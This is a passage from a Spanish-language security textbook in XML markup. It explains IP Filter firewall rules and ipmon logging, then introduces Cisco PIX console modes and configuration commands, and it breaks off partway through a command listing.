&#x00A0;#&#x00A0;Trafico&#x00A0;que&#x00A0;no&#x00A0;deberia&#x00A0;verse&#x00A0;en&#x00A0;la&#x00A0;interfaz&#x00A0;externa
&#x00A0;#####
&#x00A0;block&#x00A0;in&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;192.168.0.0/16&#x00A0;to&#x00A0;any
&#x00A0;block&#x00A0;in&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;172.16.0.0/12&#x00A0;to&#x00A0;any
&#x00A0;block&#x00A0;in&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;10.0.0.0/8&#x00A0;to&#x00A0;any
&#x00A0;block&#x00A0;in&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;127.0.0.0/8&#x00A0;to&#x00A0;any
&#x00A0;block&#x00A0;in&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;0.0.0.0/8&#x00A0;to&#x00A0;any
</literallayout>
<!--l. 996--><para>De nuevo, vemos que entender lo que hace cada regla es inmediato; lo que ahora nos puede llamar la atenci&#x00F3;n
es, por un lado, la utilizaci&#x00F3;n de la directiva &#x2018;log&#x2019;, de la que hablaremos en el punto siguiente &#x2013;
aunque no hace falta ser muy listo para imaginar qu&#x00E9; hace &#x2013; y por otro, lo que vamos a ver
ahora, el uso de &#x2018;quick&#x2019;: esta directiva provoca que la regla se aplique inmediatamente y
para el tr&#x00E1;&#xFB01;co afectado el resto de reglas no se examine. De esta forma, con la pol&#x02CA;&#x0131;tica de&#xFB01;nida
hasta ahora, si no hubi&#x00E9;ramos utilizado la directiva &#x2018;quick&#x2019; para bloquear el acceso a nuestro
puerto 79, siempre que se viera tr&#x00E1;&#xFB01;co hacia este servicio se analizar&#x02CA;&#x0131;a el &#xFB01;chero completo, y
como la &#x00FA;ltima regla que hace match es la que indica su bloqueo, las tramas se denegar&#x02CA;&#x0131;an; al
utilizar &#x2018;quick&#x2019;, en el momento que esta regla hace match, el tr&#x00E1;&#xFB01;co se deniega sin seguir
examinando la pol&#x02CA;&#x0131;tica, presentando as&#x02CA;&#x0131; un comportamiento m&#x00E1;s similar al de las reglas de otros
&#xFB01;rewalls.
<!--br/-->
<!--br/-->Hasta ahora nos hemos limitado a crear o modi&#xFB01;car el &#xFB01;chero donde de&#xFB01;nimos la pol&#x02CA;&#x0131;tica de IP Filter,
pero esos cambios no van a tener efecto hasta que la m&#x00E1;quina se reinicie o hasta que obliguemos al &#xFB01;rewall
a releer su archivo de con&#xFB01;guraci&#x00F3;n; para esto &#x00FA;ltimo podemos invocar al shellscript que carga el cortafuegos
en el arranque de la m&#x00E1;quina pas&#x00E1;ndole el par&#x00E1;metro &#x2018;reload&#x2019;, de la forma /etc/init.d/ipfboot
reload.
  </para></section><!--end subsection--><!--l. 1017--><section 
role="subsection"><title><abbrev role="title-mark">16.3.4</abbrev><anchor 
   id="x1-25800016.3.4"  ></anchor>El sistema de log</title>
<!--l. 1018--><para>  Como cualquier sistema cortafuegos, IP Filter es capaz de generar registros cuando una determinada
trama hace match con una regla que as&#x02CA;&#x0131; lo indica; la forma de indicarlo, como ya hemos adelantado en el
punto anterior, es mediante la directiva &#x2018;log&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;block&#x00A0;in&#x00A0;log&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;any&#x00A0;to&#x00A0;any&#x00A0;port&#x00A0;=&#x00A0;79
</literallayout>
<!--l. 1027--><para>Esta regla bloquea (&#x2018;block&#x2019;) de forma inmediata (&#x2018;quick&#x2019;) el tr&#x00E1;&#xFB01;co de entrada (&#x2018;in&#x2019;) a trav&#x00E9;s del interfaz
elxl0, desde cualquier origen (&#x2018;from any&#x2019;) a cualquier destino (&#x2018;to any&#x2019;) y cuyo puerto destino sea el
79 (correspondiente a finger); mediante &#x2018;log&#x2019; hacemos que siempre que se haga match con ella esta regla
genere un registro, para lo cual se utiliza la utilidad ipmon, inicializada en el mismo script que hemos visto
antes para cargar la pol&#x02CA;&#x0131;tica de seguridad.
<!--br/-->
<!--br/-->Por defecto, ipmon registra eventos con tipo &#x2018;local0&#x2019; y las siguientes prioridades predeterminadas
(<citation>[?]</citation>)
     </para><itemizedlist>
     <listitem>
     <!--l. 1038--><para>info: Paquetes que son s&#x00F3;lo registrados, no aceptados o denegados.
     </para></listitem>
     <listitem>
     <!--l. 1039--><para>notice: Paquetes registrados en una regla &#x2018;pass&#x2019;.
     </para></listitem>
     <listitem>
     <!--l. 1040--><para>warning: Paquetes registrados en una regla &#x2018;block&#x2019;.
     </para></listitem>
     <listitem>
     <!--l. 1041--><para>error: Paquetes cortos que pueden evidenciar un ataque basado en fragmentaci&#x00F3;n de tramas
     IP.</para></listitem></itemizedlist>
<!--l. 1044--><para>Aunque este modelo suele ser m&#x00E1;s que su&#xFB01;ciente en la mayor&#x02CA;&#x0131;a de situaciones, si necesitamos un registro m&#x00E1;s
&#xFB01;no podemos especi&#xFB01;car, mediante la directiva &#x2018;level&#x2019;, el tipo y la prioridad con que deseamos que una
determinada regla registre las tramas que hacen match con ella; as&#x02CA;&#x0131;, en el caso de la regla anterior, si
queremos que cuando alguien trate de acceder al servicio finger de una m&#x00E1;quina el tr&#x00E1;&#xFB01;co se bloquee y
adem&#x00E1;s se registre un evento con tipo &#x2018;auth&#x2019; y prioridad &#x2018;alert&#x2019; (en lugar de &#x2018;local0&#x2019; y &#x2018;warning&#x2019;, que
ser&#x02CA;&#x0131;an los que le corresponder&#x02CA;&#x0131;an por defecto), debemos reescribir la regla de una forma similar
a:

     </para><literallayout role="verbatim">
&#x00A0;block&#x00A0;in&#x00A0;log&#x00A0;level&#x00A0;auth.alert&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;any&#x00A0;to&#x00A0;any&#x00A0;port&#x00A0;=&#x00A0;79
</literallayout>
<!--l. 1059--><para>Cuando esta regla haga match, se generar&#x00E1; en el &#xFB01;chero correspondiente (no debemos olvidarnos de pegarle
un vistazo a nuestro /etc/syslogd.conf para ver d&#x00F3;nde se van a registrar los mensajes) una entrada de
esta forma:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;tail&#x00A0;-1&#x00A0;/var/log/syslog
&#x00A0;02:59:04&#x00A0;anita&#x00A0;ipmon[7043]:&#x00A0;[ID&#x00A0;702911&#x00A0;auth.alert]&#x00A0;02:59:04.700386&#x00A0;elxl0&#x00A0;&#x005C;
&#x00A0;@0:2&#x00A0;b&#x00A0;62.42.102.18,4897&#x00A0;-&#x003E;&#x00A0;192.168.0.3,79&#x00A0;PR&#x00A0;tcp&#x00A0;len&#x00A0;20&#x00A0;48&#x00A0;-S&#x00A0;IN
&#x00A0;anita:/#
</literallayout>
<!--l. 1070--><para>Aparte de generar eventos a trav&#x00E9;s de syslog, la herramienta ipmon permite monitorizar en tiempo real las
tramas que generan registros mediante opciones como &#x2018;-o&#x2019; o &#x2018;-a&#x2019;, en l&#x02CA;&#x0131;nea de comandos; evidentemente
esto es &#x00FA;til para visualizar en una terminal el estado del log en nuestro cortafuegos, por ejemplo para iniciar
mecanismos de respuesta autom&#x00E1;tica ante un determinado evento; para obtener m&#x00E1;s informaci&#x00F3;n acerca de
esta herramienta, y del sistema de log de IP Filter en general, podemos consultar la p&#x00E1;gina de manual de
ipmon(8).
  </para></section><!--end subsection--></section><!--end section--><!--l. 1078--><section 
role="section"><title><abbrev role="title-mark">16.4</abbrev><anchor 
   id="x1-25900016.4"  ></anchor>PIX Firewall</title>
<!--l. 1082--><para>  <anchor 
   id="x1-259001f2"  ></anchor><footnote><para>   La secci&#x00F3;n dedicada al cortafuegos PIX est&#x00E1; basada en un documento realizado por Juan Antonio Cebri&#x00E1;n, Carlos Garc&#x02CA;&#x0131;a y
  Antonio Villal&#x00F3;n, acerca de la implantaci&#x00F3;n y gesti&#x00F3;n de uno de estos &#xFB01;rewalls dentro del proyecto InfoCentre (Generalitat
  Valenciana).</para></footnote>
  </para><!--l. 1083--><section 
role="subsection"><title><abbrev role="title-mark">16.4.1</abbrev><anchor 
   id="x1-26000016.4.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 1084--><para>  PIX (Private Internet eXchange) es una de las soluciones de seguridad ofrecidas por Cisco Systems; se
trata de un &#xFB01;rewall completamente hardware: a diferencia de otros sistemas cortafuegos, PIX no se ejecuta
en una m&#x00E1;quina Unix, sino que incluye un sistema operativo empotrado denominado Finesse que desde
espacio de usuario se asemeja m&#x00E1;s a un router que a un sistema Unix cl&#x00E1;sico. Por tanto, dado que la gesti&#x00F3;n
de este cortafuegos no es tan inmediata para un administrador de sistemas como la de uno que se ejecute
sobre Unix, vamos a dedicarle m&#x00E1;s tiempo al PIX Firewall de lo que hemos dedicado al resto de
cortafuegos.
<!--br/-->
<!--br/-->El cortafuegos PIX utiliza un algoritmo de protecci&#x00F3;n denominado Adaptive Security Algorithm (ASA): a
cualquier paquete inbound (generalmente, los provenientes de redes externas que tienen como origen una
red protegida) se le aplica este algoritmo antes de dejarles atravesar el &#xFB01;rewall, aparte de realizar
comprobaciones contra la informaci&#x00F3;n de estado de la conexi&#x00F3;n (PIX es stateful) en memoria; para ello, a
cada interfaz del &#xFB01;rewall se le asigna un nivel de seguridad comprendido entre 0 (el interfaz menos seguro,
externo) y 100 (el m&#x00E1;s seguro, interno). La &#xFB01;losof&#x02CA;&#x0131;a de funcionamiento del Adaptive Security Algorithm se
basa en estas reglas:
     </para><itemizedlist>
     <listitem>
     <!--l. 1104--><para>Ning&#x00FA;n paquete puede atravesar el cortafuegos sin tener conexi&#x00F3;n y estado.
     </para></listitem>
     <listitem>
     <!--l. 1106--><para>Cualquier conexi&#x00F3;n cuyo origen tiene un nivel de seguridad mayor que el destino (outbound) es
     permitida si no se proh&#x02CA;&#x0131;be expl&#x02CA;&#x0131;citamente mediante listas de acceso.
     </para></listitem>
     <listitem>
     <!--l. 1109--><para>Cualquier conexi&#x00F3;n que tiene como origen una interfaz o red de menor seguridad que su destino
     (inbound) es denegada, si no se permite expl&#x02CA;&#x0131;citamente mediante listas de acceso.
     </para></listitem>
     <listitem>
     <!--l. 1112--><para>Los paquetes ICMP son detenidos a no ser que se habilite su tr&#x00E1;&#xFB01;co expl&#x02CA;&#x0131;citamente.

     </para></listitem>
     <listitem>
     <!--l. 1114--><para>Cualquier intento de violaci&#x00F3;n de las reglas anteriores es detenido, y un mensaje de alerta es
     enviado a syslog.</para></listitem></itemizedlist>
<!--l. 1117--><para>Cuando a un interfaz del cortafuegos llega un paquete proveniente de una red con menor nivel de seguridad
que su destino, el &#xFB01;rewall le aplica el adaptive security algorithm para veri&#xFB01;car que se trata
de una trama v&#x00E1;lida, y en caso de que lo sea comprobar si del host origen se ha establecido
una conexi&#x00F3;n con anterioridad; si no hab&#x02CA;&#x0131;a una conexi&#x00F3;n previa, el &#xFB01;rewall PIX crea una nueva
entrada en su tabla de estados en la que se incluyen los datos necesarios para identi&#xFB01;car a la
conexi&#x00F3;n.
<!--br/-->
<!--br/-->El cortafuegos PIX puede resultar muy complejo de gestionar, especialmente a los que provenimos del
mundo Unix, ya que como hemos dicho se asemeja m&#x00E1;s a un router que a un servidor con cualquier &#xFB02;avour
de Unix; es por tanto recomendable consultar bibliograf&#x02CA;&#x0131;a adicional antes de trabajar con estos equipos.
Una buena referencia puede ser <citation>[?]</citation>, as&#x02CA;&#x0131; como la documentaci&#x00F3;n sobre el producto que est&#x00E1; disponible a trav&#x00E9;s
de la web de Cisco Systems (http://www.cisco.com/).
  </para></section><!--end subsection--><!--l. 1131--><section 
role="subsection"><title><abbrev role="title-mark">16.4.2</abbrev><anchor 
   id="x1-26100016.4.2"  ></anchor>La primera sesi&#x00F3;n con PIX Firewall</title>
<!--l. 1132--><para>  Si conectamos al &#xFB01;rewall por consola a trav&#x00E9;s de una l&#x02CA;&#x0131;nea serie entramos directamente sin
necesidad de contrase~na, en modo no privilegiado; esto lo sabemos porque nos aparece el prompt
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;pixie&#x003E;
</literallayout>
<!--l. 1140--><para>Si en este prompt tecleamos la orden &#x2018;?&#x2019;, nos mostrar&#x00E1; la ayuda disponible en el modo sin privilegios:

     </para><literallayout role="verbatim">
&#x00A0;dixie&#x003E;&#x00A0;?
&#x00A0;enable&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enter&#x00A0;privileged&#x00A0;mode&#x00A0;or&#x00A0;change&#x00A0;privileged&#x00A0;mode&#x00A0;password
&#x00A0;pager&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Control&#x00A0;page&#x00A0;length&#x00A0;for&#x00A0;pagination
&#x00A0;quit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Disable,&#x00A0;end&#x00A0;configuration&#x00A0;or&#x00A0;logout
&#x00A0;dixie&#x003E;
</literallayout>
<!--l. 1151--><para>Son pocos comandos con los que apenas se puede hacer nada; la orden pager nos permite ajustar el n&#x00FA;mero
de l&#x02CA;&#x0131;neas para paginar, la orden quit (o exit) sale del &#xFB01;rewall, y la orden enable nos pasa a modo
superusuario, pidiendo la contrase~na (que por defecto ser&#x00E1; &#x2018;cisco&#x2019;); cada orden del PIX se puede abreviar
(por ejemplo, en lugar de enable podr&#x02CA;&#x0131;amos teclear ena):

     </para><literallayout role="verbatim">
&#x00A0;dixie&#x003E;&#x00A0;ena
&#x00A0;Password:&#x00A0;*****
&#x00A0;dixie#
</literallayout>
<!--l. 1164--><para>Como vemos, al estar en modo privilegiado, el prompt cambia y nos muestra una almohadilla; en
este modo ya podemos recon&#xFB01;gurar par&#x00E1;metros del PIX, y tenemos m&#x00E1;s &#x00F3;rdenes disponibles que
antes:

  </para><literallayout role="verbatim">
&#x00A0;dixie#&#x00A0;?
&#x00A0;arp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Change&#x00A0;or&#x00A0;view&#x00A0;the&#x00A0;arp&#x00A0;table,&#x00A0;and&#x00A0;set&#x00A0;the&#x00A0;arp&#x00A0;timeout&#x00A0;value
&#x00A0;auth-prompt&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Customize&#x00A0;authentication&#x00A0;challenge,&#x00A0;reject&#x00A0;or&#x00A0;acceptance&#x00A0;prompt
&#x00A0;configure&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;from&#x00A0;terminal,&#x00A0;floppy,&#x00A0;or&#x00A0;memory,&#x00A0;clear&#x00A0;configure
&#x00A0;copy&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Copy&#x00A0;image&#x00A0;from&#x00A0;TFTP&#x00A0;server&#x00A0;into&#x00A0;flash.
&#x00A0;debug&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Debug&#x00A0;packets&#x00A0;or&#x00A0;ICMP&#x00A0;tracings&#x00A0;through&#x00A0;the&#x00A0;PIX&#x00A0;Firewall.
&#x00A0;disable&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Exit&#x00A0;from&#x00A0;privileged&#x00A0;mode
&#x00A0;enable&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Modify&#x00A0;enable&#x00A0;password
&#x00A0;flashfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Show&#x00A0;or&#x00A0;destroy&#x00A0;filesystem&#x00A0;information
&#x00A0;kill&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Terminate&#x00A0;a&#x00A0;telnet&#x00A0;session
&#x00A0;pager&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Control&#x00A0;page&#x00A0;length&#x00A0;for&#x00A0;pagination
&#x00A0;passwd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Change&#x00A0;Telnet&#x00A0;console&#x00A0;access&#x00A0;password
&#x00A0;ping&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Test&#x00A0;connectivity&#x00A0;from&#x00A0;specified&#x00A0;interface&#x00A0;to&#x00A0;&#x003C;ip&#x003E;
&#x00A0;quit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Disable,&#x00A0;end&#x00A0;configuration&#x00A0;or&#x00A0;logout
&#x00A0;reload&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Halt&#x00A0;and&#x00A0;reload&#x00A0;system
&#x00A0;session&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Access&#x00A0;an&#x00A0;internal&#x00A0;AccessPro&#x00A0;router&#x00A0;console
&#x00A0;terminal&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Set&#x00A0;terminal&#x00A0;line&#x00A0;parameters
&#x00A0;who&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Show&#x00A0;active&#x00A0;administration&#x00A0;sessions&#x00A0;on&#x00A0;PIX
&#x00A0;write&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Write&#x00A0;config&#x00A0;to&#x00A0;net,&#x00A0;flash,&#x00A0;floppy,&#x00A0;or&#x00A0;terminal,&#x00A0;or&#x00A0;erase&#x00A0;flash
&#x00A0;dixie#
</literallayout>
<!--l. 1189--><para>  Para comenzar a recon&#xFB01;gurar el &#xFB01;rewall nos pondremos en modo con&#xFB01;guraci&#x00F3;n (desde modo privilegiado)
con la orden con&#xFB01;gure (la &#x2018;t&#x2019; corresponde a Terminal); de nuevo, cambia el prompt que nos aparece en
consola:

     </para><literallayout role="verbatim">
&#x00A0;dixie#&#x00A0;con&#x00A0;t
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1199--><para>En este modo disponemos de m&#x00E1;s comandos para con&#xFB01;gurar el PIX; como siempre, podemos verlos con la
orden &#x2018;?&#x2019;:

  </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;?
&#x00A0;aaa&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enable,&#x00A0;disable,&#x00A0;or&#x00A0;view&#x00A0;TACACS+&#x00A0;or&#x00A0;RADIUS
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;user&#x00A0;authentication,&#x00A0;authorization&#x00A0;and&#x00A0;accounting
&#x00A0;access-group&#x00A0;&#x00A0;&#x00A0;&#x00A0;Bind&#x00A0;an&#x00A0;access-list&#x00A0;to&#x00A0;an&#x00A0;interface&#x00A0;to&#x00A0;filter&#x00A0;inbound&#x00A0;traffic
&#x00A0;access-list&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Add&#x00A0;an&#x00A0;access&#x00A0;list
&#x00A0;age&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;This&#x00A0;command&#x00A0;is&#x00A0;deprecated.&#x00A0;See&#x00A0;ipsec,&#x00A0;isakmp,&#x00A0;map,&#x00A0;ca&#x00A0;commands
&#x00A0;alias&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Administer&#x00A0;overlapping&#x00A0;addresses&#x00A0;with&#x00A0;dual&#x00A0;NAT.
&#x00A0;apply&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Apply&#x00A0;outbound&#x00A0;lists&#x00A0;to&#x00A0;source&#x00A0;or&#x00A0;destination&#x00A0;IP&#x00A0;addresses
&#x00A0;arp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Change&#x00A0;or&#x00A0;view&#x00A0;the&#x00A0;arp&#x00A0;table,&#x00A0;and&#x00A0;set&#x00A0;the&#x00A0;arp&#x00A0;timeout&#x00A0;value
&#x00A0;auth-prompt&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Customize&#x00A0;authentication&#x00A0;challenge,&#x00A0;reject&#x00A0;or&#x00A0;acceptance&#x00A0;prompt
&#x00A0;aaa-server&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Define&#x00A0;AAA&#x00A0;Server&#x00A0;group
&#x00A0;ca&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;CEP&#x00A0;(Certificate&#x00A0;Enrollment&#x00A0;Protocol)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Create&#x00A0;and&#x00A0;enroll&#x00A0;RSA&#x00A0;key&#x00A0;pairs&#x00A0;into&#x00A0;a&#x00A0;PKI&#x00A0;(Public&#x00A0;Key&#x00A0;Infrastructure).
&#x00A0;clock&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Show&#x00A0;and&#x00A0;set&#x00A0;the&#x00A0;date&#x00A0;and&#x00A0;time&#x00A0;of&#x00A0;PIX
&#x00A0;conduit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Add&#x00A0;conduit&#x00A0;access&#x00A0;to&#x00A0;higher&#x00A0;security&#x00A0;level&#x00A0;network&#x00A0;or&#x00A0;ICMP
&#x00A0;crypto&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;IPsec,&#x00A0;IKE,&#x00A0;and&#x00A0;CA
&#x00A0;configure&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;from&#x00A0;terminal,&#x00A0;floppy,&#x00A0;or&#x00A0;memory,&#x00A0;clear&#x00A0;configure
&#x00A0;copy&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Copy&#x00A0;image&#x00A0;from&#x00A0;TFTP&#x00A0;server&#x00A0;into&#x00A0;flash.
&#x00A0;debug&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Debug&#x00A0;packets&#x00A0;or&#x00A0;ICMP&#x00A0;tracings&#x00A0;through&#x00A0;the&#x00A0;PIX&#x00A0;Firewall.
&#x00A0;disable&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Exit&#x00A0;from&#x00A0;privileged&#x00A0;mode
&#x00A0;domain-name&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Change&#x00A0;domain&#x00A0;name
&#x00A0;dynamic-map&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Specify&#x00A0;a&#x00A0;dynamic&#x00A0;crypto&#x00A0;map&#x00A0;template
&#x00A0;enable&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Modify&#x00A0;enable&#x00A0;password
&#x00A0;established&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Allow&#x00A0;inbound&#x00A0;connections&#x00A0;based&#x00A0;on&#x00A0;established&#x00A0;connections
&#x00A0;failover&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enable/disable&#x00A0;PIX&#x00A0;failover&#x00A0;feature&#x00A0;to&#x00A0;a&#x00A0;standby&#x00A0;PIX
&#x00A0;filter&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enable,&#x00A0;disable,&#x00A0;or&#x00A0;view&#x00A0;URL,&#x00A0;Java,&#x00A0;and&#x00A0;ActiveX&#x00A0;filtering
&#x00A0;fixup&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Add&#x00A0;or&#x00A0;delete&#x00A0;PIX&#x00A0;service&#x00A0;and&#x00A0;feature&#x00A0;defaults
&#x00A0;flashfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Show&#x00A0;or&#x00A0;destroy&#x00A0;filesystem&#x00A0;information
&#x00A0;ipsec&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;IPSEC&#x00A0;policy
&#x00A0;isakmp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;ISAKMP&#x00A0;policy
&#x00A0;global&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Specify,&#x00A0;delete&#x00A0;or&#x00A0;view&#x00A0;global&#x00A0;address&#x00A0;pools,
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;or&#x00A0;designate&#x00A0;a&#x00A0;PAT(Port&#x00A0;Address&#x00A0;Translated)&#x00A0;address
&#x00A0;hostname&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Change&#x00A0;host&#x00A0;name
&#x00A0;vpdn&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;VPDN&#x00A0;(PPTP)&#x00A0;Policy
&#x00A0;interface&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Identify&#x00A0;network&#x00A0;interface&#x00A0;type,&#x00A0;speed&#x00A0;duplex,&#x00A0;and&#x00A0;if&#x00A0;shutdown
&#x00A0;ip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Set&#x00A0;ip&#x00A0;address&#x00A0;for&#x00A0;specified&#x00A0;interface,
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;define&#x00A0;a&#x00A0;local&#x00A0;address&#x00A0;pool,&#x00A0;or
